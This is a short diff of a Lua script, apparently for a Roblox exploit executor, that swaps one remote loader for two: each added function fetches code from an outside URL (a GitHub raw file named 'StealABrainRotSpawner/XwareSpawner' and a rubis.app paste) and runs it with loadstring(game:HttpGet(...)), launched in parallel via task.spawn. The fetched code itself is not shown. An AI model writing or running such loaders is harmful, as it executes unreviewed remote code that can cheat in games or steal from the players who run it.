@@ -1,2 +1,8 @@
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/visual2.lua"))()
+local function s1()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Crypoth/StealABrainRotSpawner/refs/heads/main/XwareSpawner"))()
+end
+local function s2()
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/wqwPnXOsVHWV6RTM/raw"))()
+end
+task.spawn(s1)
+task.spawn(s2)
